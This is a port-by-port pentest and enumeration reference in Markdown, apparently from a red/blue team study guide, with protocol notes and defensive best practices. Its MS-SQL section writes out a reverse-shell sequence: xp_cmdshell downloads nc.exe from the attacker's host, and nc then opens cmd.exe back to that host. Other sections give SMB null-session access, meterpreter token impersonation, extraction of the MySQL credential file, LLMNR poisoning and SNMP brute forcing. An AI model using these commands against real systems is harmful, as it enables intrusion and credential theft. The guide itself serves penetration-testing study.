# TABLE OF CONTENTS
1. [9 - ECHO](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#9---echo)
2. [13 - DAYTIME](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#13---daytime)
3. [17 - CHARGEN](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#17---chargen-tcpudp)
4. [19 - QUOTE OF THE DAY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#19---quote-of-the-day-qotd)
5. [21 - FTP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#21---ftp-tcp)
6. [22 - SSH](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#22---ssh-tcp)
7. [23 - TELNET](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#23---telnet-tcpudp)
8. [25, 465, 587 - SMTP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#25465587---smtp-tcp)
9. [49 - TACACS+](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#49---tacacs-tcp)
10. [53 - DNS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#53---dns-tcpudp)
11. [67 - DHCP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#67---dhcp-udp)
12. [69 - TFTP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#69---tftp-udp)
13. [80, 443 - HTTP(S)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#80443---https)
14. [88 - KERBEROS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#88---kerberos-tcpudp)
15. [110, 995 - POP3](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#110995---pop3)
16. [111 - RPCBIND](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#111---rpcbind)
17. [119 - NNTP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#119---nntp-tcp)
18. [123 - NTP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#123---ntp-udp)
19. [135 - RPC](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#135---rpc)
20. [137, 138, 139 - NetBIOS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#137138139---netbios-tcpudp)
21. [143,993 - IMAP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#143---imap-tcp)
22. [161,162 - SNMP, SNMPTRAP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#161162---snmpsnmptrap-typically-udpalso-tcp)
23. [445 - SMB, CIFS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#445---smbcifs-tcp)
24. [389, 636 - LDAP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#389636---ldap-tcpudp)
25. [500 - ISAKMP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#500---isakmp-udp)
26. [513 - RLOGIN](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#513---rlogin-tcp)
27. [514, 6514 - SYSLOG](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#5146514---syslog-udptcptls)
28. [520 - RIP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#520---rip-udp)
29. [631 - IPP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#631---ipp-udp)
30. [860 - iSCSI](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#860---iscsi-tcp)
31. [1433 - MS-SQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#1433---ms-sql-tcp)
32. [1645,1646 - RADIUS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#16451646---radius-udp)
33. [3306 - MYSQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#3306---mysql-tcp)
34. [3389 - RDP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#3389---rdp-tcpudp)
35. [5432 - POSTGRESQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#5432---postgresql-tcp)
36. [5900 - VNC](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#5900---vnc-tcp)
37. [5985, 5986 - WinRM](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/2_VulnerabilityScanning_Enumeration.md#59855986---winrm-httphttps)

<br />

# 9 - ECHO
## Info
- Vulnerable to DDoS

<br />

# 13 - DAYTIME
## Info
- Vulnerbale to DDoS

<br />

# 17 - CHARGEN (TCP/UDP)
## Info
- CHARGEN = Character Generator Protocol
- Vulnerable to DDoS
- Not enabled by default
- UDP request urge random UDP reply between 0 and 512 bytes (!)

## HowTo
- Example: `telnet IPv4 chargen`
- Enabling Chargen under `/etc/inetd.conf`

<br />

# 19 - QUOTE OF THE DAY (QOTD)
## Info
- Vulnerable to DDoS
- Exp: telnet [IPv4] 17 --> returns quote
- Amplification factor: 140
- Disable/Enable: /etc/inetd.conf

<br />

# 21 - FTP (TCP)
## Info
- **File Transfer Protocol**
- Based on Client-Server Model
- FTPS (TSL for Encryption)
- Port 20: Communication
- Port 21: File Transfer
- Common GUIs: FileZilla, WinSCP, Muon

## HowTo
- `ftp 192.168.0.56 21`
- `user [username]`
- `pass [password]`
- `user anonymous`: login attempt without password

![image](https://user-images.githubusercontent.com/84674087/150594755-68fdfefc-b939-4862-920d-d90840a0d38d.png)

<br />

# 22 - SSH (TCP)
## Info
- SFTP(FTP over SSH)

<br />

# 23 - TELNET (TCP/UDP)
## Features 
- (+) cross plattform functionality due to history as IETF Standard
- (+) Admin access possible 
- (-) Deprecated Remote Access Protocoll
- (-) Unencrypted 
- (-) Only few servers left that still use telnet

## Star Wars Episode
- `telnet towel.blinkenlights.nl 23`

## How To
- `telnet host port`
   - Exp: `telnet 192.168.2.25 21`
   
<br />

# 25,465,587 - SMTP (TCP)
## Info
- ESMTP (Extended SMTP): Authentificaion + Messaging to several recipients
- See also: [Email](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Wiki/Email.md)

### Critical SMTP functions (normally disabled)
- vrfy (verify): to verify user 
- expn (expand): to show alias

### SMTP Log Codes
- Code 220: server is ready
- Code 250: message is accepted
- Code 421: service is not available 
- Code 450: server cannot access the mailbox to deliver message
- Code 451: local server aborted the action due to processing error
- Code 452: local server has insufficient storage space

## HowTo
### Validate Postfix Service on target machine
- telnet [IPV4] 25
    - mail from: [attacker]
    - rcpt to: [victim]
    - [enter your text]
    - . (a dot is needed to terminate the message)
    - quit
- If service is running, Postfix will answer with "OK"

### nmap
- nse-script: Smtp-user-enum
   - beforehand you should generate a list of potential email addresses 

### ncat (Banner Grabbing)
- `nc [IPv4] 25`
     - Example answer of mail server: `220 mail.example.net ESMTP Postfix (Debian/GNU)`
- `ehlo test`
     - Example answers:
     - 250-mail.example.net
     - 250-PIPELINING
     - 250-SIZE 102400000
     - 250-VRFY
     - 250-ETRN
     - ...

<br />

# 49 - TACACS+ (TCP)
## Info
- Cisco's **Terminal Access Controller Access Control Server** protocol is used as centralized management system (like RADIUS)
- TACACS can handle AAA separately: Authentication, Authorization and Accounting
- The ACS server communicates with the Network Access Device (NAD) encrypted (server-client model)
- TACACS is a bit slower than RADIUS due to TCP (i/o UDP) and works on Windows & Linux
- TACACS provides greater granular control (than RADIUS) as it can determine allowed user commands
- Works for Cisco Devices only !


<br />

# 53 - DNS (TCP/UDP)
## Info
### Resource Records
Record | Explanation
------ |------------
A | IPv4
AAAA | IPv6
MX | Mail Server
NS | Name Server
PTR | Pointer
SOA | Start of Authority (RNAME = DNS admin mail)
CNAME | Canonical Name (Alias or Redirection)
TXT | Text (als Informationsquelle)
SRV | weitere Services
TTL | Time to Live (cache period in seconds)

### Full Qualified Domain Name (FQDN)
Record | Explanation
------ | ----------
www | hostname
google | domain
.com | TLD (Top Level Domain)
. | separator from root 

### DNS WorkFlow
1) Device asks Resolver
2) Resolver, if no cache available, asks Root Server
3) Root Server, if no cache available, asks TLD Server
4) TLD Server, if no cache available, asks Authoritative Server
5) Resolver will cache the answer and revert the answer back to Device

![grafik](https://user-images.githubusercontent.com/84674087/132402603-19309f7e-654f-4f85-8ca9-4147b1a043c7.png)

### IoT
- IoT Devices may send their DNS queries along with a transcation ID
- This mechanism shall prevent malicious responses from attackers (who doesn't know the transaction ID)
- However, this meachanism can be weak if:
   - transaction ID is fixed
   - transaction ID is very predictable (e.g. incremental)
   - transaction ID is not verified by IoI device  

### Attack Patterns
1. **DNS Poisoning**
   - Modify resolution in DNS's server cache
   - Redirect to malicious website
2. **DNS Enumeration**
   - msfconsole `db_nmap -sU -sS -p53 [IPv4/24]`
   - Generally speaking, Brute Force against DNS might be possible even with IDS in place 
3. **Unauthorized Zone Transfers (AXFR)**
   - AXFR (Asynchronous Xfer Full Range) is a mechanism for replicating DNS data across DNS servers
   - Secondary server receives read only copy 
   - Attackers may request replication to gain information about IPs, Server Names etc.
4. **Domain Name Kiting**
   - Exploit the process of domain name registration (not a real attack)
   - Domain name is kept in limbo (5 days period) and cannot be registered by legitimate buyer

### Best Practice (Blue Team)
1. Zonetransfer only with authorized DNS Servers
2. Zonetransfer only with authentication 
3. Anonymize Email contact info under SOA
4. Split-DNS: To disclose only certain DNS information to external viewers 
5. Avoid Ressource-Records (HINFO), which could leak OS information
6. FW Rules: DNS queries only from authorised clients 

## HowTo
### Kali
- Forward: `dnsrecon -n [IPv4] -d [Domain] -a` (-a = AXFR)
- Reverse: `dnsrecon -n [IPv4] -r [192.168.1.1-192.168.1.254]`
- Forward: `dig @8.8.8.8 www.example.de A`
- Reverse: `dig -x [IPv4] @8.8.8.8`

### Windows (CMD)
1. `nslookup`
2. `server [IPv4]`
    - Example Server = 8.8.8.8  (Google)
3. `set q=any`
    - q = query
5. `ls -d [Domain]`
    - if you succeed, AXFR will be performed)

<br />

# 67 - DHCP (UDP)
## Info

*Dynamic Host Configuration Protocol*

### Assignments made by DHCP
1. IP Address
2. Subnet Mask
3. Default Gateway
4. DNS Server

### D.O.R.A. (between Client and DHCP Server)
- Discover
- Offer
- Request
- Ack

<br />

# 69 - TFTP (UDP)
## Info
- Trivial File Transfer Protocol
- Booting OS from LAN file server
- Client/Server application
- Sacrifies reliability for efficiency (UDP)

<br />

# 80,443 - HTTP(S)

<br />

# 88 - KERBEROS (TCP/UDP)

<br />

# 110,995 - POP3
## Info
- Post Office Protocol
- See also: [Email](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Wiki/Email.md)

<br />

# 111 - RPCBIND
## Info
- Maps RPC services to port numbers in UNIX-like environment

<br />

# 119 - NNTP (TCP)
## Info
- Network News Transfer Protocol
- Used to transport Usenet articles

<br />

# 123 - NTP (UDP)
## Info
- Network Time Protocol
- Hierarchical Structure: Atomic clock -> Stratum1 -> Stratum2 -> ... -> StratumX (End user)
- **PDC-Emulator**
   - First/highest Domain Controller in Active Directory Domain
   - Time emitter in whole active directory
   - Generally, PDC-Emulator is synchronized with BIOS clock
   - Alternatively, PDC-Emulator is synchronized with ext. radio clock / Internet clock

### Attack Vectors
1. Correlation of log data on monitoring-systems
2. Time stamp of authentication systems (exp: Kerberos)
3. Validity period of certificates 
4. **Information gathering and DOS attacks possible (!)**

### Best Practice
1) Deactivate NTP running service wherever possible 
2) Deactivate unnecessary features
3) Set up FW rules to allow queries only from authorized clients 

## HowTo 
- `ntptrace [IPv4]`
- `ntpq [IPv4] peers`
   - shows higher stratum server of NTP target server
- Configuration under `/etc/ntp.conf`


<br />

# 135 593 - MSRPC (TCP/UDP)
## Info
- Remote Procedure Call
- Used to locate DCOM ports to request service from a program on another PC on the network

## HowTo
### RPCclient
- **Get Access**
   - `rpcclient -U "username" [IPv4]`
   - enter PW of "username"
- **After Successful Access**
   - `rpcclient $> help (command overview)`
   - `rpcclient $> enum (after successful login)`
   - `rpcclient $> querydominfo`
   - `rpcclient $> getdompwinfo`
   - `rpcclient $> netshareenumall`

<br />

# 137,138,139 - NetBIOS (TCP/UDP)
## Info
- NetBIOS over TCP/IP (NBT)
- NetBIOS Name Service 137/udp
- NetBIOS Datagram Service 138/udp
- NetBIOS Session Service 139/tcp (Host2Host Verbindung, SMB)
- NetBIOS-Namen:
   - Always 16 chars long
   - 16th char is suffix for service 

### NetBIOS Codes
- U = Uniqe
- G = Group
Code | Meaning
---- | -------
00:G | Domain Name
00:U | workstation
20:U | File Server Service
1E:G | Browser Service Elections
1D:U | Master Browser
01:G | Master Browser
1B:U | Domain Master Browser
03:U | Messenger Service etc.

## HowTo
### Nbtscan/Nbtstat
- `nbtscan [option] [IPv4]`
- `nbtscan -r`
    - includes Win95 in its scan
- `nbtstat`
    - shows NBT (NetBIOS over TCP) connections

### enum4linux
- Wrapper of Tools inside samba package 

### NSE for SMB Enumeration
- `nmap -p139,445 --script=smb-enum* [IPv4]`
- located at `/usr/share/nmap/scripts/smb-enum`

### Rpcclient
- Windows XP/2000/NT allows non-authen SMB connection due to default settings (!) 
- Also modern samba servers may have incorrect config
    - Null Session possible: no PW needed (-U=User " ")

### Responder
- [https://github.com/lgandx/Responder/](https://github.com/lgandx/Responder/)
- CLI tool to poison NetBIOS and LLMNR (MITM!)
   - LLMNR = Link-Local Multicast Name Resolution
   - Intercepts LLMNR/NBT-NS requests and returns attacker's host IP

### nmblookup
- `nmblookup -A [IPv4]`

<br />

# 143,993 - IMAP (TCP)
## Info
- Internet Mail Application Protocol

## HowTo
- `LOGIN "user" "password"`
- `SELECT "INBOX"`
- `LOGOUT`

<br />

# 161,162 - SNMP,SNMPTRAP (typically UDP/also TCP)
## Enumeration
- **nmap**
   - `nmap -sU -p161 [IPv4] --open`
   - `nmap -sU -p161 --script=snmp* [IPv4]` (utilize all NSE scripts)
- **Metasploit**
   - `msf auxiliary/scanner/snmp/snmp_enum`
- **Onesixtyone** (Dictionary Attack)
   - `onesixtyone -c community.list -i ip_address.list -d`
- **Snmpwalk** (Quick & Simple)
   - `snmpwalk -c [community name] -v 2c [IPv4] [OID]`

## Best Practice (Blue Team)
1. Use it only where necessary
2. Select complex Community-Strings to avoid brute force attacks
3. Prefer SNMPv3 (encryption!) over SNMP v1 or v2
4. Set up FW rules for GET-REQUESTS from SNMP-Managers
5. Configure SNMP-Traps for incorrect login attempts 

<br />

# 445 - SMB/CIFS (TCP)
## Info
- Like Samba for Linux
- File Sharing Service 
- UNC-Pfad (Uniform Name Convention): \\Server address\Ressource
- Common Internet File System (CIFS) is evolution of SMB
   - New Feature: Remote Procedure Call (RPC) over 135/udp+tcp
   - CIFS communicates over own port 445/tcp (i/o NBT)
- SMB 1.0 is one of the biggest Vulnerability (~30 years old) and deactivated by default (!)

## HowTo
### SMBclient
- **Get Access**
   - `smbclient  --no-pass \\\\IPv4\\`: Access SMB shares without password
   - `smbclient --no-pass -L IPv4`: get list of shares on IPv4
   - `smbclient -U username \\\\IPv4\\ipc$`: login as user
   - `smbclient -U administrator \\\\IPv4\\C$`: login as admin
- **After Successful Access**
   - `smb: \>  get "remote-file" [local-file-name]`
   - `smb: \>  put [local-file-name] "remote-file"`
   - `smb: \> more file`: show content of file

### Windows CMD
- `net use \\[IPv4]\ipc$ "" /user:""`
   - no PW, no User
   - ipc = Interprocess Communications Share
   - $ = administrative hidden share
   - Double check mounted shares with "net view"

### Having Access as SYSTEM Account (Disadvantage)
- (!) NT AUTHORITY\SYSTEM allows full admin rights to local machine, not necessarily to shares other clients provide
- (!) Whereas as Admin, you can view remote shares and have admin right upon (as SYSTEM not)
   - while having active mpeter session:
   - `meterpreter > use incognito`
   - `meterpreter > list_tokens -u`
   - `meterpreter > impersonate_token [admin]`


<br />

# 389,636 - LDAP (TCP/UDP)
## Info
- Vendor-Neutral Standard
- For accessing/manipulating distributed directory
- Based on Client-Server-Modell
- Distinguished Name (DN) = eindeutiges Objekt in LDAP
- Common Name (CN)
- Domain Component (DC)
- knowledge about User (without root) is enough to gather information 

### Best Practice (Blue Team)
1) Prefer 636/tcp over 389/tcp for encryption purpose
2) User names in AD should not match with E-Mail addresses
3) Establish PW policy to ensure minimum security level 
4) Disable accounts after several incorrect login attempts 
5) Establish FW rules to allow access to DC and LDAP server only for authorized clients

## HowTo
1. NMAP
   - `nmap -O -sV -p389,636 --open [IPv4]`
2. JXplorer (LDAP Directory Browsing and Search Tool)
   - Kali: `apt install jxplorer`
   - Establish connection via JXplorer:
      - Host: IPv4
      - Base DN: dc=[domain]
      - User+Password
      - Enter user@domain and password
3. LDAP Admin (Windows)
   - Alternative LDAP Tool from ldapadmin.org

<br />

# 500 - ISAKMP (UDP)
## Info
- ISAKMP = Internet Security Association and Key Management
- Used to set up IPsec tunnels

<br />

# 513 - Rlogin (TCP)
## Info
- Remote Login Service
- Best Practice: [Remote Access Management](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Wiki/Remote%20Access%20Management.md)

<br />

# 514,6514 - Syslog (UDP)(TCP/TLS)
## Info
- Enables different apps/SW to transmit logs to central server
- Especially concerning routers and firewalls
- Encryption/authentication not by default (!)
- Reliability drawback (UDP) in case of congested NWs (!) 
- Windows: Not natively installed 
   - look for syslog-win32
- Newer implementations can use 1468/TCP + TLS + MD-5/SHA1 for higher security function
    - checkout "syslog-ng" or "rsyslog"
    - Linux: `cat /etc/logrotate` for configuration details

### Syslog Content
- PRI (priority code)
- Header (timestamp etc)
- Message portion
- Example: Nov 5 19:42:01 ubu-student anacron[610]: Job `cron.daily' terminated

### PRI
- Calculated from severity level of data
- 0 - Emergency
- 1 - Alert
- 2 - Critical
- 3 - Error
- 5 - Notification
- 6 - Informational
- 7 - Debugging

<br />

# 520 - RIP (UDP)
## Info
- Routing Information Protocol

<br />

# 631 - IPP (UDP)
## Info
- Internet Printing Protocol

<br />

# 860 - iSCSI (TCP)
## Info
- Linking data storage facilities over IP (SAN)

<br />

# 1433 - MS-SQL (TCP)
## Info
- Receive SQL DB queries from clients
- The useful python tool [impacket](https://github.com/SecureAuthCorp/impacket) helps to interact with MS-SQL

## HowTo
- `python3 mssqlclient.py hostname/sql_user@10.10.10.27 -windows-auth`
- Establich a Reverse Shell via netcat
```
#start http server on your machine
python -m http.server 80
#on target machine; use the IPv4 of your machine to transfer nc.exe onto the target machine
xp_cmdshell powershell wget -UseBasicParsing http://10.10.16.79:80/nc.exe -o %userprofile%/nc.exe
#start listener on your machine
nc -lvnp 4444
#invoke reverse shell on target machine
xp_cmdshell powershell %userprofile%/nc.exe -nv 10.10.16.79 4444 -e cmd.exe
```
- `psexec.py Administrator@10.10.10.27`: Once you find credentials you can logon to target machine via psexec.py

<br />

# 1645,1646 - RADIUS (UDP) 
## Info
- Remote Authen. Dial-In User Service
- Centralized Administration of dial-up/VPN/Wireless Authen (802.1x/EAP)
- Configured at Layer 7
- Authentication 1645
- Accounting 1646
- 1645,1646 (proprietary) or 1812,1813 (standard)

<br />

# 3306 - MySQL (TCP)
## Info
### Best Practice (Blue Team)
1. Use parameterized SQL Statements
2. Implement Input-Validation 
3. Minimal DB access rights 
4. Deactivate unnecessary standard features of your DB server
5. Patch your DB Server continuously
6. SQL Mode: **STRICT_ALL_TABLES**
   - MySQL can handle invalid/missing values differently depending on whether strict SQL mode is enabled (e.g. INSERT, UPDATE)
   - Without strict mode the server tries to proceed (i/o error handling) 
   - Recommendation: Enable strict mode
7. Symbolic Links 
   - Deactivating symlinks in the database settings prevents symlinks to be used for database files
   - The symbolic-links option might allow an attacker to access certain files or directories
   - Recommendation: Disable symbolic links
8. Host Wildcards
   - MySQL can use host wildcards when granting permissions to users
   - Example: `’<user>’@’%’`
   - Recommendation: Avoid wildcards in order to control specific locations, from which a given user may interact with the database

## HowTo
- `mysql -u root -p`: login as specified user (followed by PW prompt)
- `mysql -u root -h remoteHostIP`: login remotely as specified user
- `MariaDB> show databases;`: show DB
- `MariaDB> use [database];`: select one DB
- `MariaDB> show tables;`: show tables
- `MariaDB> select * from [table];`: show content
- You may get access to root password by running on target machine: `strings /var/lib/mysql/mysql/user.MYD`

![image](https://user-images.githubusercontent.com/84674087/155029858-d64035dc-e8c5-462d-94d8-b7063d92efda.png)

<br />

# 3389 - RDP (TCP/UDP)
## Info
- Remote Desktop Protocol
- Remote connection via GUI (MS Proprietary)
- Best Practice: [Remote Access Management](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Wiki/Remote%20Access%20Management.md)

## HowTo
- `rdesktop -u username 10.x.x.x:3389`: This command may not work due to NLA protection (Network Level Authentication)
- `xfreerdp /u:"username" /v:10.x.x.x:3389`: Alternative

<br />

# 5432 - POSTGRESQL (TCP)
## HowTo
- `su -i postgres` or `sudo -i -u postgres`: login as postgres user
- `psql`: connect to postgresql DB

<br />

# 5900 - VNC (TCP)
## Info
- Virtual Network Computing
- Cross-platform version of RDP
- Requires client/server/protocol to be configured
- Should only be used for internal network (!) --> for external NWs VPN is preferred

<br />

# 5985,5986 - WinRM (HTTP/HTTPS)
## Info
- Windows Remote Management
- In Windows integrated remote management protocol 
- Uses SOAP (Simple Object Access Protokoll) for connection setup 
